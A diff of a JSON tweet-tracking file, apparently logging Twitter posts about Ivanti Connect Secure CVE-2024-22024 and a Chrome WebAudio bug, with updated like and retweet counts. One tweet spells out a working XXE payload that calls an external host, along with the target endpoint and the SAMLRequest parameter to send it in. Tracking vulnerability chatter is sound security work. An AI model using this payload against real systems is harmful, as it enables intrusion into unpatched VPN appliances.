@@ -55,6 +55,16 @@
     "tweetfavorites": 0,
     "tweetquotes": 0,
     "tweetreplies": 0,
+    "tweetretweets": 32,
+    "tweettext": "RT @Shadowserver: Ivanti Connect Secure CVE-2024-22024 activity:  we started seeing exploitation attempts to '/dana-na/auth/saml-sso.cgi' F…",
+    "tweettime": "2024-02-12, 21:32:23",
+    "tweeturl": "https://twitter.com/cyb3rops/status/1757155716912033978",
+    "username": "cyb3rops"
+}
+{
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
     "tweetretweets": 31,
     "tweettext": "RT @hosselot: \"Tianfu Cup 2023\" Chrome use-after-free vulnerability in WebAudio bug entry (CVE-2023-5996 [1497859]) is now open with a PoC:…",
     "tweettime": "2024-02-12, 21:15:58",
@@ -121,10 +131,10 @@
     "username": "Dinosn"
 }
 {
-    "tweetfavorites": 170,
+    "tweetfavorites": 171,
     "tweetquotes": 0,
-    "tweetreplies": 10,
-    "tweetretweets": 12,
+    "tweetreplies": 11,
+    "tweetretweets": 13,
     "tweettext": "I got the CVE-2024-22024\n\n#bugbounty #intigriti #hackerone #XXE https://t.co/au3vVt6qWj",
     "tweettime": "2024-02-10, 08:13:17",
     "tweeturl": "https://twitter.com/JPD_1206/status/1756229838237467037",
@@ -180,10 +190,10 @@
     "expanded_url": [
         "https://github.com/0dteam/CVE-2024-22024"
     ],
-    "tweetfavorites": 113,
+    "tweetfavorites": 115,
     "tweetquotes": 0,
     "tweetreplies": 2,
-    "tweetretweets": 50,
+    "tweetretweets": 49,
     "tweettext": "Ivanti CVE-2024-22024 XXE POC \n\n&gt; FOR EDUCATIONAL PURPOSE AND AUTHORIZED TESTING ONLY.\n\nhttps://t.co/h5PuwGQXzG",
     "tweettime": "2024-02-09, 20:41:53",
     "tweeturl": "https://twitter.com/M_haggis/status/1756055841143480723",
@@ -259,7 +269,7 @@
     "tweetfavorites": 0,
     "tweetquotes": 0,
     "tweetreplies": 0,
-    "tweetretweets": 57,
+    "tweetretweets": 56,
     "tweettext": "RT @watchtowrcyber: 🚀Ivanti Connect Secure CVE-2024-22024 \n\nwe've released our watchTowr Labs blog post, containing a little bit of comment…",
     "tweettime": "2024-02-09, 14:03:13",
     "tweeturl": "https://twitter.com/cyb3rops/status/1755955514091979207",
@@ -299,10 +309,10 @@
     "username": "piedpiper1616"
 }
 {
-    "tweetfavorites": 544,
+    "tweetfavorites": 558,
     "tweetquotes": 1,
     "tweetreplies": 3,
-    "tweetretweets": 120,
+    "tweetretweets": 130,
     "tweettext": "CVE-2024-22024,  XXE on Ivanti Connect Secure\n\npayload encoded base64:\n\n&lt;?xml version=\"1.0\" ?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % xxe SYSTEM \"http://{{external-host}}/x\"&gt; %xxe;]&gt;&lt;r&gt;&lt;/r&gt;\n\nsend it to  127.0.0.1/dana-na/auth/saml-sso.cgi with SAMLRequest parm\n\n#bugbountytips #cve #Ivanti https://t.co/ShIkDghTU0",
     "tweettime": "2024-02-09, 07:03:25",
     "tweeturl": "https://twitter.com/h4x0r_dz/status/1755849867149103106",
